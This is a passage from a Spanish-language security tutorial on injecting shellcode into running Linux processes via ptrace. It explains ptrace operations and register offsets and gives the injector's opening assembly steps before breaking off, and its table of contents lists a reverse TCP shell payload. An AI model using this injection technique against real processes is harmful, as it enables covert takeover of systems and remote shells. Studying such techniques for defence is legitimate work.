          <li class="md-nav__item">
  <a href="#redirigir-ejecucion-al-inicio-del-shellcode-y-detach" class="md-nav__link">
    <span class="md-ellipsis">
      
        Redirigir Ejecución al Inicio del Shellcode y Detach
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#el-shellcode-reverse-tcp-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        El shellcode: Reverse TCP shell
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="El shellcode: Reverse TCP shell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#flujo-del-proceso-padre" class="md-nav__link">
    <span class="md-ellipsis">
      
        Flujo del Proceso Padre
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flujo-del-proceso-hijo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Flujo del proceso Hijo
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#codigo-completo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Código Completo
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Código Completo">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#proc_injasm-inyector" class="md-nav__link">
    <span class="md-ellipsis">
      
        proc_inj.asm (Inyector)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#proc_inj_rev_tcpasm-shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      
        proc_inj_rev_tcp.asm (Shellcode)
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#compilacion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Compilación
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#caso-practico" class="md-nav__link">
    <span class="md-ellipsis">
      
        Caso Práctico
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#consideraciones-de-seguridad" class="md-nav__link">
    <span class="md-ellipsis">
      
        Consideraciones de seguridad
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#agradecimientos" class="md-nav__link">
    <span class="md-ellipsis">
      
        Agradecimientos
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Tabla de contenidos
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduccion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introducción
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#la-syscall-ptrace" class="md-nav__link">
    <span class="md-ellipsis">
      
        La syscall PTRACE
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="La syscall PTRACE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#que-permite-hacer-ptrace" class="md-nav__link">
    <span class="md-ellipsis">
      
        ¿Qué permite hacer ptrace?
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#argumentos-de-entrada" class="md-nav__link">
    <span class="md-ellipsis">
      
        Argumentos de Entrada
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#estructura-user_regs_struct" class="md-nav__link">
    <span class="md-ellipsis">
      
        Estructura user_regs_struct
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#explicacion-del-inyector-paso-a-paso" class="md-nav__link">
    <span class="md-ellipsis">
      
        Explicación del inyector paso a paso
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Explicación del inyector paso a paso">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#seccion-de-datos" class="md-nav__link">
    <span class="md-ellipsis">
      
        Sección de Datos
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attach-y-detencion-del-proceso" class="md-nav__link">
    <span class="md-ellipsis">
      
        Attach y Detención del Proceso
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preservacion-del-contexto-de-ejecucion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Preservación del Contexto de Ejecución
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inyeccion-de-la-instruccion-syscall" class="md-nav__link">
    <span class="md-ellipsis">
      
        Inyección de la Instrucción Syscall
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#configuracion-de-registros-para-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Configuración de Registros para MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ejecucion-controlada-de-la-syscall-mmap" class="md-nav__link">
    <span class="md-ellipsis">
      
        Ejecución Controlada de la Syscall MMAP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#restauracion-del-contenido-en-la-direccion-apuntada-por-rip" class="md-nav__link">
    <span class="md-ellipsis">
      
        Restauración del Contenido en la Dirección Apuntada por RIP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#restauracion-de-los-registros-originales" class="md-nav__link">
    <span class="md-ellipsis">
      
        Restauración de los Registros Originales
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#almacenamiento-del-rip-de-retorno" class="md-nav__link">
    <span class="md-ellipsis">
      
        Almacenamiento del RIP de Retorno
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inyeccion-del-shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      
        Inyección del Shellcode
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#redirigir-ejecucion-al-inicio-del-shellcode-y-detach" class="md-nav__link">
    <span class="md-ellipsis">
      
        Redirigir Ejecución al Inicio del Shellcode y Detach
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#el-shellcode-reverse-tcp-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        El shellcode: Reverse TCP shell
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="El shellcode: Reverse TCP shell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#flujo-del-proceso-padre" class="md-nav__link">
    <span class="md-ellipsis">
      
        Flujo del Proceso Padre
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flujo-del-proceso-hijo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Flujo del proceso Hijo
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#codigo-completo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Código Completo
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Código Completo">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#proc_injasm-inyector" class="md-nav__link">
    <span class="md-ellipsis">
      
        proc_inj.asm (Inyector)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#proc_inj_rev_tcpasm-shellcode" class="md-nav__link">
    <span class="md-ellipsis">
      
        proc_inj_rev_tcp.asm (Shellcode)
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#compilacion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Compilación
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#caso-practico" class="md-nav__link">
    <span class="md-ellipsis">
      
        Caso Práctico
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#consideraciones-de-seguridad" class="md-nav__link">
    <span class="md-ellipsis">
      
        Consideraciones de seguridad
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#agradecimientos" class="md-nav__link">
    <span class="md-ellipsis">
      
        Agradecimientos
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="process-injection-via-ptrace">Process Injection via Ptrace<a class="headerlink" href="#process-injection-via-ptrace" title="Permanent link">&para;</a></h1>
<p class="article-meta">01/02/2026 · 120 min de lectura</p>

<p>Inyección de código en procesos Linux usando <code>ptrace</code>, implementado completamente en ensamblador x86-64. Sin dependencias.</p>
<hr />
<div class="admonition danger">
<p class="admonition-title">Uso responsable</p>
<p>El contenido de este sitio web se publica <strong>exclusivamente con fines educativos e informativos</strong>. El autor <strong>no promueve, respalda ni se hace responsable</strong> del uso indebido o ilegal de la información aquí expuesta. Cualquier acción realizada a partir de este contenido debe llevarse a cabo <strong>únicamente</strong> en entornos controlados, sistemas propios o <strong>con autorización expresa y verificable</strong> del propietario del sistema.</p>
</div>
<h2 id="introduccion">Introducción<a class="headerlink" href="#introduccion" title="Permanent link">&para;</a></h2>
<p>En esta técnica <strong>un proceso (<em>tracer</em>) toma el control de otro proceso en ejecución (<em>tracee</em>) para inyectar y ejecutar código arbitrario dentro de su espacio de direcciones</strong>. En Linux, el mecanismo que lo hace posible es la syscall <code>ptrace</code>, la misma que utilizan internamente depuradores como GDB o herramientas de trazado como strace.</p>
<p>La idea general es sencilla, adjuntarnos al proceso víctima, pausar su ejecución, reservar memoria ejecutable dentro de su espacio de direcciones, copiar nuestro shellcode en esa memoria y redirigir el flujo de ejecución hacia él.</p>
<p>La explotación constará de dos componentes:</p>
<ul>
<li><strong><code>proc_inj.asm</code></strong>: El programa inyector. Se encarga de adjuntarse al proceso víctima, reservar memoria, copiar el shellcode y redirigir la ejecución.</li>
<li><strong><code>proc_inj_rev_tcp.asm</code></strong>: Se convertirá en el shellcode que será inyectado. En este caso, será una reverse shell TCP modificada que, tras la inyección, hace que el proceso padre retome a su ejecución rutinaria mientras el proceso hijo (nuevo) establece la conexión reversa.</li>
</ul>
<h2 id="la-syscall-ptrace">La syscall <code>PTRACE</code><a class="headerlink" href="#la-syscall-ptrace" title="Permanent link">&para;</a></h2>
<p>Todas las operaciones relevantes sobre el proceso víctima se realizan a través de la syscall <code>ptrace</code> (process trace) (número 101 en x86-64). Aunque fue diseñada originalmente para implementar depuradores y herramientas de diagnóstico, su capacidad de manipular completamente la ejecución de un proceso la convierte también en un vector de ataque.</p>
<p>A nivel de kernel, cuando un proceso se vincula a otro mediante <code>ptrace</code>, se establece una relación especial entre ambos. El kernel marca al <em>tracee</em> con un flag interno (<code>PT_PTRACED</code>) indicando que está siendo trazado. A partir de ese momento, ciertos puntos de ejecución pasan a estar mediados por el <em>tracer</em>. Cuando el <em>tracee</em> alcanza uno de estos puntos, en lugar de continuar su ejecución normal, el kernel lo detiene y coloca en un estado de pausa controlada (ptrace-stop), donde permanece suspendido hasta que el <em>tracer</em> decida reanudarlo.</p>
<p>El <em>tracer</em> es notificado de estas paradas mediante el mecanismo <code>wait*</code>, que reutiliza el sistema estándar de espera entre procesos de Linux para indicarle la razón de la detención. Mientras el <em>tracee</em> está detenido, el <em>tracer</em> puede inspeccionar o modificar su estado completo (registros/memoria) y decidir cómo continuar la ejecución.</p>
<h3 id="que-permite-hacer-ptrace">¿Qué permite hacer ptrace?<a class="headerlink" href="#que-permite-hacer-ptrace" title="Permanent link">&para;</a></h3>
<p>Las capacidades que permite <code>ptrace</code> sobre el proceso <em>tracee</em> son las siguientes:</p>
<ul>
<li><strong>Leer y escribir memoria</strong>: Acceso directo al espacio de direcciones del <em>tracee</em>. Permite examinar el código que está ejecutando, inspeccionar variables en el stack o el heap y escribir datos o instrucciones en cualquier dirección mapeada.</li>
<li><strong>Leer y escribir registros del CPU</strong>: Acceso completo a todos los registros del procesador. Esto permite conocer exactamente en qué punto de ejecución se encuentra el <em>tracee</em> y manipular el flujo de control modificando el instruction pointer y/o los argumentos de las syscalls.</li>
<li><strong>Controlar la ejecución instrucción por instrucción</strong>: Con operaciones como <code>PTRACE_SINGLESTEP</code>, el <em>tracer</em> puede ejecutar exactamente una instrucción del <em>tracee</em> y detenerlo de nuevo, permitiendo observar los cambios que produce cada instrucción individual.</li>
<li><strong>Interceptar syscalls</strong>: El <em>tracer</em> puede ser notificado cada vez que el <em>tracee</em> entra o sale de una syscall, permitiendo inspeccionar o modificar los argumentos y valores de retorno. Esta es la base de herramientas como <code>strace</code>.</li>
<li><strong>Interceptar señales</strong>: El <em>tracer</em> recibe las señales dirigidas al <em>tracee</em> antes de que este las procese, pudiendo suprimirlas, modificarlas o inyectar nuevas señales.</li>
</ul>
<h3 id="argumentos-de-entrada">Argumentos de Entrada<a class="headerlink" href="#argumentos-de-entrada" title="Permanent link">&para;</a></h3>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">rax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">101</span><span class="w">        </span><span class="p">;</span><span class="w"> </span><span class="n">número</span><span class="w"> </span><span class="n">de</span><span class="w"> </span><span class="n">syscall</span><span class="w"> </span><span class="p">(</span><span class="n">__NR_ptrace</span><span class="p">)</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">rdi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="w">    </span><span class="p">;</span><span class="w"> </span><span class="n">operación</span><span class="w"> </span><span class="p">(</span><span class="n">PTRACE_</span><span class="o">*</span><span class="p">)</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">rsi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pid</span><span class="w">        </span><span class="p">;</span><span class="w"> </span><span class="n">PID</span><span class="w"> </span><span class="n">del</span><span class="w"> </span><span class="n">proceso</span><span class="w"> </span><span class="n">objetivo</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">rdx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addr</span><span class="w">       </span><span class="p">;</span><span class="w"> </span><span class="n">dirección</span><span class="w"> </span><span class="p">(</span><span class="n">puntero</span><span class="p">)</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">r10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="w">       </span><span class="p">;</span><span class="w"> </span><span class="n">dato</span><span class="o">/</span><span class="n">dirección</span><span class="w"> </span><span class="p">(</span><span class="n">puntero</span><span class="p">)</span>
</span></code></pre></div>
<p>Las operaciones de <code>ptrace</code> usadas son:</p>
<table>
<thead>
<tr>
<th>Operación</th>
<th>Valor</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>PTRACE_ATTACH</code></td>
<td>16</td>
<td>El <em>tracer</em> se adjunta al proceso con PID indicado en <code>pid</code>. El kernel envía <code>SIGSTOP</code> al <em>tracee</em>. Se requiere <code>wait4</code> para esperar la detención efectiva.</td>
</tr>
<tr>
<td><code>PTRACE_PEEKDATA</code></td>
<td>2</td>
<td>Lee 8 bytes de la memoria del <em>tracee</em> en la dirección <code>addr</code>. El valor leído se almacena en la dirección apuntada por <code>data</code>.</td>
</tr>
<tr>
<td><code>PTRACE_POKEDATA</code></td>
<td>5</td>
<td>Escribe el valor de <code>data</code> (8 bytes) en la memoria del <em>tracee</em> en la dirección <code>addr</code>.</td>
</tr>
<tr>
<td><code>PTRACE_SINGLESTEP</code></td>
<td>9</td>
<td>Reanuda la ejecución del <em>tracee</em> pero lo detiene de nuevo tras ejecutar <strong>una sola instrucción</strong>. Requiere <code>wait4</code> después para sincronizarse.</td>
</tr>
<tr>
<td><code>PTRACE_GETREGS</code></td>
<td>12</td>
<td>Copia todos los registros del CPU del <em>tracee</em> en un buffer proporcionado por el <em>tracer</em> (a través de <code>data</code>), siguiendo el layout de <code>user_regs_struct</code>.</td>
</tr>
<tr>
<td><code>PTRACE_SETREGS</code></td>
<td>13</td>
<td>Establece todos los registros del CPU del <em>tracee</em> desde un buffer proporcionado por el <em>tracer</em> (a través de <code>data</code>).</td>
</tr>
<tr>
<td><code>PTRACE_DETACH</code></td>
<td>17</td>
<td>El <em>tracer</em> se desadjunta del <em>tracee</em>, eliminando el flag <code>PT_PTRACED</code>. El que era el <em>tracee</em> reanuda su ejecución.</td>
</tr>
</tbody>
</table>
<h3 id="estructura-user_regs_struct">Estructura <code>user_regs_struct</code><a class="headerlink" href="#estructura-user_regs_struct" title="Permanent link">&para;</a></h3>
<p>Cuando se usa <code>PTRACE_GETREGS</code> o <code>PTRACE_SETREGS</code>, se trabaja con una estructura de <strong>27 campos de 8 bytes</strong> (216 bytes en total) <strong>que contiene todos los registros del CPU</strong>. El orden de los campos y sus offsets es fundamental para manipular registros específicos:</p>
<div class="grid">
<table>
<thead>
<tr>
<th>Offset</th>
<th>Registro</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>0x00</code></td>
<td><code>R15</code></td>
</tr>
<tr>
<td><code>0x08</code></td>
<td><code>R14</code></td>
</tr>
<tr>
<td><code>0x10</code></td>
<td><code>R13</code></td>
</tr>
<tr>
<td><code>0x18</code></td>
<td><code>R12</code></td>
</tr>
<tr>
<td><code>0x20</code></td>
<td><code>RBP</code></td>
</tr>
<tr>
<td><code>0x28</code></td>
<td><code>RBX</code></td>
</tr>
<tr>
<td><code>0x30</code></td>
<td><code>R11</code></td>
</tr>
<tr>
<td><code>0x38</code></td>
<td><code>R10</code></td>
</tr>
<tr>
<td><code>0x40</code></td>
<td><code>R9</code></td>
</tr>
<tr>
<td><code>0x48</code></td>
<td><code>R8</code></td>
</tr>
<tr>
<td><code>0x50</code></td>
<td><code>RAX</code></td>
</tr>
<tr>
<td><code>0x58</code></td>
<td><code>RCX</code></td>
</tr>
<tr>
<td><code>0x60</code></td>
<td><code>RDX</code></td>
</tr>
<tr>
<td><code>0x68</code></td>
<td><code>RSI</code></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Registro</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>0x70</code></td>
<td><code>RDI</code></td>
</tr>
<tr>
<td><code>0x78</code></td>
<td><code>ORIG_RAX</code></td>
</tr>
<tr>
<td><code>0x80</code></td>
<td><code>RIP</code></td>
</tr>
<tr>
<td><code>0x88</code></td>
<td><code>CS</code></td>
</tr>
<tr>
<td><code>0x90</code></td>
<td><code>EFLAGS</code></td>
</tr>
<tr>
<td><code>0x98</code></td>
<td><code>RSP</code></td>
</tr>
<tr>
<td><code>0xA0</code></td>
<td><code>SS</code></td>
</tr>
<tr>
<td><code>0xA8</code></td>
<td><code>FS_BASE</code></td>
</tr>
<tr>
<td><code>0xB0</code></td>
<td><code>GS_BASE</code></td>
</tr>
<tr>
<td><code>0xB8</code></td>
<td><code>DS</code></td>
</tr>
<tr>
<td><code>0xC0</code></td>
<td><code>ES</code></td>
</tr>
<tr>
<td><code>0xC8</code></td>
<td><code>FS</code></td>
</tr>
<tr>
<td><code>0xD0</code></td>
<td><code>GS</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="explicacion-del-inyector-paso-a-paso">Explicación del inyector paso a paso<a class="headerlink" href="#explicacion-del-inyector-paso-a-paso" title="Permanent link">&para;</a></h2>
<h3 id="seccion-de-datos">Sección de Datos<a class="headerlink" href="#seccion-de-datos" title="Permanent link">&para;</a></h3>
<p><strong>La sección <code>.data</code> del inyector contiene el shellcode.</strong> Este shellcode es la versión compilada de <code>proc_inj_rev_tcp.asm</code> (explicado más adelante en este artículo), pero podría ser el que el atacante quisiera.</p>
<p>La sección <code>.bss</code> reserva tres buffers de 216 bytes cada uno (27 registros x 8 bytes):</p>
<ul>
<li><strong><code>regs</code></strong>: Buffer de trabajo donde se cargan y modifican los registros del <em>tracee</em>.</li>
<li><strong><code>regs_ori</code></strong>: Copia de respaldo de los registros originales del <em>tracee</em>.</li>
<li><strong><code>regs_sys</code></strong>: Buffer auxiliar para capturar el resultado de la syscall <code>mmap</code> ejecutada en el <em>tracee</em>.</li>
</ul>
<h3 id="attach-y-detencion-del-proceso">Attach y Detención del Proceso<a class="headerlink" href="#attach-y-detencion-del-proceso" title="Permanent link">&para;</a></h3>
<p>El PID del proceso objetivo se almacena previamente en un registro.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">; 1 Attach y detención del proceso</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="c1">; PTRACE_ATTACH</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">          </span><span class="c1">; PTRACE_ATTACH (0x10)</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">         </span><span class="c1">; PID</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="nb">rdx</span><span class="w">          </span><span class="c1">; addr</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">         </span><span class="c1">; data</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">    </span><span class="c1">; WAIT4: </span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">        </span><span class="c1">; Cuando se hace PTRACE_ATTACH, el kernel envía SIGSTOP al proceso objetivo. </span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">        </span><span class="c1">; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  </span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">        </span><span class="c1">; esté efectivamente detenido antes de poder manipularlo.</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">61</span>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">            </span><span class="c1">; PID a esperar (-1 para cualquier hijo)</span>
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="w">        </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">            </span><span class="c1">; &amp;status</span>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">            </span><span class="c1">; options</span>
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">            </span><span class="c1">; rusage</span>
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">        </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>El primer paso es <strong>adjuntarse al proceso víctima</strong> usando <code>PTRACE_ATTACH</code> (operación 16). </p>
<p>Cuando el kernel recibe esta solicitud, envía una señal <code>SIGSTOP</code> al proceso <em>tracee</em>, lo que provoca su detención. Sin embargo, esta detención no es instantánea, el proceso necesita tiempo para procesar la señal y detenerse efectivamente. Por eso es imprescindible llamar a <code>wait4</code> (syscall número 61) inmediatamente después. Esta llamada bloquea al <em>tracer</em> hasta que el <em>tracee</em> esté completamente detenido y listo para ser manipulado.</p>
<blockquote>
<p>Sin la ejecución de la syscall <code>wait4</code>, cualquier operación posterior sobre el <em>tracee</em> podría fallar o producir resultados impredecibles porque el proceso aún no estaría en un estado estable.
</p>
</blockquote>
<h3 id="preservacion-del-contexto-de-ejecucion">Preservación del Contexto de Ejecución<a class="headerlink" href="#preservacion-del-contexto-de-ejecucion" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">; 2 Preservación del contexto de ejecución</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">   </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">  </span><span class="c1">; PID</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">  </span><span class="c1">; addr</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se va almacenar la estructura de registros</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">    </span><span class="c1">; Copia de los registros originales del traceee en el buffer de backup</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w">       </span><span class="c1">; RSI se usa como puntero de origen y va avanzando</span>
